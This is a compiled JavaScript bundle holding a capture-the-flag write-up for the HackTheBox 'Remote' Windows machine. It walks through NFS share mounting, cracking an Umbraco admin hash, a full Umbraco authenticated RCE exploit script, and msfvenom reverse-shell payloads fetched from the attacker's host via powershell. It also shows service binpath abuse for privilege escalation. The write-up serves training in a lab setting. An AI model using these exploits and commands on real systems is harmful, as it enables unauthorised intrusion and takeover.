"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1242],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var p=r.createContext({}),l=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},c=function(e){var t=l(e.components);return r.createElement(p.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,p=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=l(n),d=a,h=u["".concat(p,".").concat(d)]||u[d]||m[d]||o;return n?r.createElement(h,s(s({ref:t},c),{},{components:n})):r.createElement(h,s({ref:t},c))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,s=new Array(o);s[0]=d;var i={};for(var p in t)hasOwnProperty.call(t,p)&&(i[p]=t[p]);i.originalType=e,i[u]="string"==typeof e?e:a,s[1]=i;for(var l=2;l<o;l++)s[l]=n[l];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},5577:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>p,contentTitle:()=>s,default:()=>m,frontMatter:()=>o,metadata:()=>i,toc:()=>l});var r=n(87462),a=(n(67294),n(3905));const o={layout:"post",title:"Remote ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","pe","exploit","htb","dotnet","service"],date:"2020/09/07",thumbnail:"/img/HackTheBox/remote.png",toc:!0},s="Information",i={unversionedId:"HackTheBox/Remote/write-up",id:"HackTheBox/Remote/write-up",title:"Remote ",description:"- Name: Remote",source:"@site/writeups/HackTheBox/Remote/write-up.md",sourceDirName:"HackTheBox/Remote",slug:"/HackTheBox/Remote/write-up",permalink:"/writeups/HackTheBox/Remote/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"windows",permalink:"/writeups/tags/windows"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"dotnet",permalink:"/writeups/tags/dotnet"},{label:"service",permalink:"/writeups/tags/service"}],version:"current",frontMatter:{layout:"post",title:"Remote ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","pe","exploit","htb","dotnet","service"],date:"2020/09/07",thumbnail:"/img/HackTheBox/remote.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Ready ",permalink:"/writeups/HackTheBox/Ready/write-up"},next:{title:"ScriptKiddie ",permalink:"/writeups/HackTheBox/ScriptKiddie/write-up"}},p={},l=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"Discovery",id:"discovery",level:2},{value:"HTTP exploitation",id:"http-exploitation",level:2},{value:"Privilege Escalation of Machine",id:"privilege-escalation-of-machine",level:2}],c={toc:l},u="wrapper";function m(e){let{components:t,...o}=e;return(0,a.kt)(u,(0,r.Z)({},c,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"information"},"Information"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," Remote"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/234"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Windows"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"Remote",src:n(87724).Z,width:"598",height:"381"})),(0,a.kt)("h2",{id:"overview"},"Overview"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": exploiting Umbraco CMS RCE & pe through a Windows service."),(0,a.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pacman -S nmap nfs-utils exploitdb metasploit\n")),(0,a.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://nmap.org/"},"Nmap")," port discovery & service:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Thu Mar 26 23:51:54 2020 as: nmap -A -o nmap_full 10.10.10.180\nNmap scan report for 10.10.10.180\nHost is up (0.031s latency).\nNot shown: 993 closed ports\nPORT     STATE SERVICE       VERSION\n21/tcp   open  ftp           Microsoft ftpd\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Home - Acme Widgets\n111/tcp  open  rpcbind       2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/tcp6  rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  2,3,4        111/udp6  rpcbind\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp   nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n2049/tcp open  mountd        1-3 (RPC #100005)\n5985/tcp open  wsman\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=3/26%OT=21%CT=1%CU=31453%PV=Y%DS=2%DC=T%G=Y%TM=5E7D326\nOS:0%P=x86_64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=\nOS:S%TS=U)SEQ(SP=100%GCD=1%ISR=106%CI=I%II=I%TS=U)OPS(O1=M54DNW8NNS%O2=M54D\nOS:NW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)WIN(W1=FFFF%W2=\nOS:FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54DNW8N\nOS:NS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S\nOS:=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R\nOS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=\nOS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=\nOS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID\nOS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 2m31s\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2020-03-26T22:55:29\n|_  start_date: N/A\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   30.61 ms 10.10.14.1\n2   30.75 ms 10.10.10.180\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Mar 26 23:53:20 2020 -- 1 IP address (1 host up) scanned in 86.43 seconds\n")),(0,a.kt)("h2",{id:"discovery"},"Discovery"),(0,a.kt)("p",null,"We can find some interesting pages on the web server:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"http://10.10.10.180/people/"},"http://10.10.10.180/people/")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"http://10.10.10.180/about-us/todo-list-for-the-starter-kit/"},"http://10.10.10.180/about-us/todo-list-for-the-starter-kit/")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms"},"http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms"))),(0,a.kt)("p",null,"The last one suggests an Umbraco CMS is used."),(0,a.kt)("p",null,"Also the mountd service allow us to list mounts and as there is a public\nnfs share we can mount it:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ showmount -e 10.10.10.180\nExport list for 10.10.10.180:\n/site_backups (everyone)\n\n$ sudo mount 10.10.10.180:/site_backups $(pwd)/dossier\n")),(0,a.kt)("p",null,"Then we can find a file leaking the Umbraco admin credentials:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'$ strings App_Data/Umbraco.sdf | grep admin@htb\nadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50\nadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f\n')),(0,a.kt)("p",null,"With ",(0,a.kt)("a",{parentName:"p",href:"https://inventory.raw.pm/tools.html#CrackStation"},"CrackStation")," is cracked the hash, so the credentials are:"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"admin@htb.local")," / ",(0,a.kt)("inlineCode",{parentName:"p"},"baconandcheese")),(0,a.kt)("p",null,"We can log in with them and then generate a reverse shell with ",(0,a.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"metasploit"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.222 LPORT=9999 -f aspx > shell.aspx\n")),(0,a.kt)("p",null,"But afterward I saw ",(0,a.kt)("inlineCode",{parentName:"p"},".aspx")," extension is disallowed:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cat dossier/Config/umbracoSettings.config| grep disallowedUploadFiles\n    <disallowedUploadFiles>ashx,aspx,ascx,config,cshtml,vbhtml,asmx,air,axd,swf,xml,xhtml,html,htm,svg,php,htaccess</disallowedUploadFiles>\n")),(0,a.kt)("p",null,"So uploading a webshell through the webUI won't be possible."),(0,a.kt)("h2",{id:"http-exploitation"},"HTTP exploitation"),(0,a.kt)("p",null,"We can look for an Umbraco exploit to get a RCE:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ searchsploit umbraco\n-------------------------------------------------------------------------------------------- ----------------------------------------\n Exploit Title                                                                              |  Path\n                                                                                            | (/usr/share/exploitdb/)\n-------------------------------------------------------------------------------------------- ----------------------------------------\nUmbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                  | exploits/aspx/webapps/46153.py\nUmbraco CMS - Remote Command Execution (Metasploit)                                         | exploits/windows/webapps/19671.rb\nUmbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                  | exploits/php/webapps/44988.txt\n-------------------------------------------------------------------------------------------- ----------------------------------------\nShellcodes: No Result\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-py"},"\nimport requests\nimport re\nimport argparse\n\nfrom bs4 import BeautifulSoup\n\nparser = argparse.ArgumentParser(prog='exploit.py',\n    description='Umbraco authenticated RCE',\n    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))\nparser.add_argument('-u', '--user', metavar='USER', type=str,\n    required=True, dest='user', help='username / email')\nparser.add_argument('-p', '--password', metavar='PASS', type=str,\n    required=True, dest='password', help='password')\nparser.add_argument('-i', '--host', metavar='URL', type=str, required=True,\n    dest='url', help='root URL')\nparser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,\n    dest='command', help='command')\nparser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,\n    dest='arguments', help='arguments', default='')\nargs = parser.parse_args()\n\n# Payload\npayload = \"\"\"\\\n<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:csharp_user=\"http://csharp.mycompany.com/mynamespace\"><msxsl:script language=\"C#\" implements-prefix=\"csharp_user\">public string xml() { string cmd = \"%s\"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \"%s\"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match=\"/\"> <xsl:value-of select=\"csharp_user:xml()\"/> </xsl:template> </xsl:stylesheet>\\\n\"\"\" % (args.arguments, args.command)\n\nlogin = args.user\npassword = args.password\nhost = args.url\n\n# Process Login\nurl_login = host + \"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin\"\nloginfo = { \"username\": login, \"password\": password}\ns = requests.session()\nr2 = s.post(url_login,json=loginfo)\n\n# Go to vulnerable web page\nurl_xslt = host + \"/umbraco/developer/Xslt/xsltVisualize.aspx\"\nr3 = s.get(url_xslt)\n\nsoup = BeautifulSoup(r3.text, 'html.parser')\nVIEWSTATE = soup.find(id=\"__VIEWSTATE\")['value']\nVIEWSTATEGENERATOR = soup.find(id=\"__VIEWSTATEGENERATOR\")['value']\nUMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']\nheaders = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}\ndata = { \"__EVENTTARGET\": \"\", \"__EVENTARGUMENT\": \"\", \"__VIEWSTATE\": VIEWSTATE,\n    \"__VIEWSTATEGENERATOR\": VIEWSTATEGENERATOR,\n    \"ctl00$body$xsltSelection\": payload,\n    \"ctl00$body$contentPicker$ContentIdValue\": \"\",\n    \"ctl00$body$visualizeDo\": \"Visualize+XSLT\" }\n\n# Launch the attack\nr4 = s.post(url_xslt, data=data, headers=headers)\n# Filter output\nsoup = BeautifulSoup(r4.text, 'html.parser')\nCMDOUTPUT = soup.find(id=\"result\").getText()\nprint(CMDOUTPUT)\n")),(0,a.kt)("p",null,"This time we can generate an exe reverse shell (rather than aspx webshell),\nuse the above RCE exploit to get a powershell shell, upload the reverse shell,\nand gain shell access:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.222 LPORT=9999 -f exe > reverse.exe\n$ python -m http.server --bind 10.10.15.222 8080\n$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command ls'\n\n\n    Directory: C:\\windows\\system32\\inetsrv\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        2/19/2020   3:11 PM                Config\nd-----        2/19/2020   3:11 PM                en\nd-----        2/19/2020   3:11 PM                en-US\n...\n\n$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command wget http://10.10.15.222:8080/reverse.exe -OutFile C:/Users/Public/cyfun.exe'\n$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command C:/Users/Public/cyfun.exe'\n\nPS C:\\windows\\system32\\inetsrv> gc C:/Users/Public/user.txt\n8eb35aa443795d5f4f306c100344e0d7\n")),(0,a.kt)("h2",{id:"privilege-escalation-of-machine"},"Privilege Escalation of Machine"),(0,a.kt)("p",null,"Some enumeration tools show exploitable services like ",(0,a.kt)("inlineCode",{parentName:"p"},"UsoSvc")," so I found an\narticle explaining the attack:\n",(0,a.kt)("a",{parentName:"p",href:"https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/"},"CVE-2019-1405 and CVE-2019-1322 - Elevation to SYSTEM via the UPnP Device Host Service and the Update Orchestrator Service"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'sc config UsoSvc binpath= "cmd.exe /c copy C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt C:\\\\windows\\\\system32\\\\cyfun.txt &"\nsc config UsoSvc binpath= "cmd.exe /c copy del C:\\\\windows\\\\system32\\\\cyfun.txt &"\nC:\\windows\\system32\\inetsrv>type C:\\windows\\system32\\cyfun.txt\n9421fa1e9e59dd1a93d10a7efd87b5c2\n\nsc config UsoSvc binpath= "cmd.exe /c del C:\\\\windows\\\\system32\\\\cyfun.txt &"\n')))}m.isMDXComponent=!0},87724:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/remote-9a408cc48d8d66d7fea0bea4f6206f25.png"}}]);